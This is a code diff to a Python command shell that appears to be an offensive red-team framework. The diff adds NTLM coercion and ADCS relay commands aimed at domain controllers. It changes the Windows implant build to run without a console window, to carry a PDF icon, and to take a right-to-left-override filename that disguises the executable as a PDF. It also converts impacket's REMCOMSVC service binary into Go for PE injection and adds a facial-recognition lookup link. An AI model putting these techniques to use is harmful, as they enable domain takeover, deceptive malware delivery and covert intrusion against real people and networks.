@@ -115,6 +115,7 @@ class LazyOwnShell(cmd2.Cmd):
         "caja": "sh caja sessions",
         "chown": "sh sudo -s chown 1000:1000 . -R",
         "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control", 
+        "coerce_plus": f"sh netexec smb {rhost} -u {start_user} -p '{start_pass}' -d {domain} -M coerce_plus -o LISTENER={lhost}",
         "creds": "sh cat sessions/credentials*",
         "cloudflare_tunnel": f"sh bash modules/mkcloudflaretunnel.sh {c2_port}",
         "disable_ftrace": "sh sudo sysctl kernel.ftrace_enabled=0",
@@ -151,6 +152,7 @@ class LazyOwnShell(cmd2.Cmd):
         "nf": f"sh ./modules/nf -d {rhost} -o sessions/{rhost}_nuclerfuzzer",
         "nmap_ldap_rootdse": f"sh sudo nmap -Pn --script ldap-rootdse.nse {rhost}",
         "nxcridbrute": f"sh nxc smb {rhost} -u 'anonymous' -p '' --rid-brute 3000",
+        "ntlmrelayx": f"sh ntlmrelayx.py --raw-port 6667 -t http://{domain}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
         "kallsyms": "sh sudo cat /proc/kallsyms",
         "kvpn":"sh sudo killall openvpn",
         "nmap": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazynmap.ls\"",
@@ -1125,7 +1127,26 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         self.cmd(f"{path}/modules/lazynmap.sh -d")
         return
-    
+
+    @cmd2.with_category(scanning_category) 
+    def do_lazynmap(self, line):
+        """
+        Runs the internal module `modules/lazynmap.sh` with target mode.
+
+        This method executes the `lazynmap` script in target mode. It uses the current
+        working directory for locating the script.
+        
+        :param line: The network ip to be used for scanning.
+        :type line: str
+
+        :return: None
+        """
+        if not line:
+            line = self.params["rhost"]
+        path = os.getcwd()
+        self.cmd(f"{path}/modules/lazynmap.sh -t {line}")
+        return
+
     @cmd2.with_category(scanning_category) 
     def run_lazysniff(self):
         """
@@ -10782,7 +10803,18 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "windows":
             binary = f"{line}.exe"
-            compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+
+            tool_to_check = "rsrc"
+            if check_go_tool_installed(tool_to_check):
+                print_msg(f"Tool '{tool_to_check}' is installed.")
+            else:
+                print_msg(f"Installing tool '{tool_to_check}'.")
+                install = "go install github.com/akavel/rsrc@latest"
+                self.cmd(install)
+            icon_command = f"rsrc -ico static/pdf.ico -o sessions/icon.syso"
+            self.cmd(icon_command)
+
+            compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w -H=windowsgui\" -o {implantgo} {implant_go}"
             compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
@@ -10802,6 +10834,11 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(upx)
             upx = f"upx {self.sessions_dir}/b{binary}"
             self.cmd(upx)
+            new_binary = f"{self.sessions_dir}/{binary}"
+            newname = (new_binary.split('.')[0] + u'\u202e' + ".pdfx"[::-1]  + new_binary.split('.')[1]).encode('utf-8')
+    
+            print_msg("New Camuflage File " + str(newname))
+            shutil.copy(file, newname)
 
         elif platform == "darwin":
             binary = line
@@ -14844,6 +14881,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         self.cmd(command)
         self.cmd(f"cat {log} |  sed 's/requesting://' >> sessions/users.txt")
+        self.cmd(f"tac sessions/users.txt | grep -v '^$' | sponge sessions/users.txt")
         return
 
     @cmd2.with_category(exploitation_category)   
@@ -21007,7 +21045,7 @@ class LazyOwnShell(cmd2.Cmd):
         atomic_repo = "https://github.com/redcanaryco/atomic-red-team.git"
         atomic_path = os.path.join("external", ".exploit", "atomic-red-team")
         atomic_yaml_path = os.path.join(atomic_path, "atomics")
-        sessions_path = os.path.join("sessions")
+        sessions_path = os.path.join("sessions/temp_uploads")
         tmp_path = "/tmp/lazyown_atomic_test"
         atomic = "PathToAtomicsFolder"
         if not os.path.exists(atomic_path):
@@ -21116,7 +21154,7 @@ class LazyOwnShell(cmd2.Cmd):
             """.replace("            ","")
         else:
             test_script_content = f"""#!/bin/sh
-            exec > >(tee -a {log_path}) 2>&1
+            #exec > >(tee -a {log_path}) 2>&1
             # Get prerequisite command
             {get_prereq_command}
 
@@ -22953,7 +22991,8 @@ class LazyOwnShell(cmd2.Cmd):
             ("cryptpad","https://cryptpad.fr/"),
             ("kycnot","https://kycnot.me/"),
             ("socks proxy list","https://spys.one/en/socks-proxy-list/"),
-            ("Config ntlm2 BurpSuit", "https://portswigger.net/support/configuring-ntlm-with-burp-suite")
+            ("Config ntlm2 BurpSuit", "https://portswigger.net/support/configuring-ntlm-with-burp-suite"),
+            ("Facial recon","https://pimeyes.com/es")
 
 
 
@@ -26150,6 +26189,36 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"[!] Error during extraction: {str(e)}")
             print_error(traceback.format_exc())
 
+    def do_convert_remcomsvc_from_file(self, arg):
+        """Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go. see lazyaddon GoPEInjection
+        Usage: convert_remcomsvc_from_file
+        Return: Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go.
+        """
+        sys.path.append('./env/lib/python3.12/site-packages/impacket/examples')
+        import remcomsvc
+
+        remcomsvc_python_bytes = remcomsvc.REMCOMSVC
+
+        golang_escaped_string = ""
+        for byte in remcomsvc_python_bytes:
+            golang_escaped_string += f"\\x{byte:02x}"
+
+        golang_declaration = f"var REMCOMSVC = \"{golang_escaped_string}\""
+
+        print_msg("RemCosSVC Golang (escaped string):")
+        sample = golang_declaration[:min(200, len(golang_declaration))]  # Mostrar los primeros 200 caracteres como muestra
+        print_msg(sample + ("..." if len(golang_declaration) > 200 else ""))
+
+        sessions_dir = 'sessions'
+        os.makedirs(sessions_dir, exist_ok=True)
+        filepath = os.path.join(sessions_dir, 'remcomsvc.go')
+
+        try:
+            with open(filepath, 'w') as f:
+                f.write(f"package main\n\n{golang_declaration}\n")
+            print_msg(f"File saved in: {filepath}")
+        except Exception as e:
+            print_error(f"Error saving the file: {e}")
 
 if __name__ == "__main__":
     p = LazyOwnShell()
